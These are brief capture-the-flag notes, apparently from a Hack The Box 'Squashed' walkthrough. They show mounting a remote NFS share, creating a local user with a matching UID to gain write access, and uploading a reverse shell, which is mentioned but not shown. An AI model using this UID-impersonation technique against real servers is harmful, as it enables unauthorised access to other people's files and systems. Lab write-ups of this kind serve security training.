# The keepass file seemed to be a dead end..
# nfs file shares use the userid to determine ownership of the files. The owner of this directory is a user with an id of 1001. Knowing this we can make a user with the specified id:
# I mount the directory
sudo mount -t nfs 10.10.11.191:/var/www/html ~/HTB/squashed/webshare -o nolock
# I cant view /var/www/html, as I dont have the right permissions. Owner has UID of 2017
# Creating user rosehacks and giving him UID of 2017
sudo useradd rosehacks
sudo usermod -u 2017 rosehacks
su rosehacks
# Can view and upload to the directory now.
# I upload a reverse shell and get a shell as Alex
# Priv Escalation
